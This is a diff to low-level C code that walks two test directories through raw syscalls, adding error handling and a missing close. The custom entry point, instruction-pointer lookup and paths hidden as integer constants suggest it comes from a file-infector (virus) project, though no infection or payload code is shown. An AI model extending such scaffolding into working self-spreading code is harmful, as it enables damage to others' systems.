@@ -19,7 +19,7 @@ void _start() {
 	get_rip(start_rip);
 
 	int64_t		ret = 0;
-	uint64_t	fd;
+	int64_t		fd;
 	byte		buff[BUFF_SIZE];
 	//str		directories[] = {"/tmp/test1", "/tmp/test2", NULL};
 	uint64_t	directories[] = {0x7365742f706d742f, 0x003174, 0x7365742f706d742f, 0x003274, 0, 0};
@@ -43,10 +43,15 @@ void _start() {
 		max_path[len_dir] = '/';
 
 		open(fd, dir_name, O_RDONLY);	
+		if (fd < 0) {
+			printf(FILE_LINE("open(%s) \033[31mfail:\033[0m %ld\n"), dir_name, ret);
+			break;
+		}
 
 		getdents(ret, fd, buff, BUFF_SIZE);
 		if (ret < 0) {
 			printf(FILE_LINE("gedents() \033[31mfail:\033[0m %ld\n"), ret);
+			break;
 		}
 
 		while (ret > 0) {
@@ -78,6 +83,8 @@ void _start() {
 				printf(FILE_LINE("gedents() \033[31mfail:\033[0m %ld\n"), ret);
 			}
 		}
+
+		close(fd);
 
 		for (size_t i = 0; i < len_dir + 1; i++)
 			max_path[i] = 0;
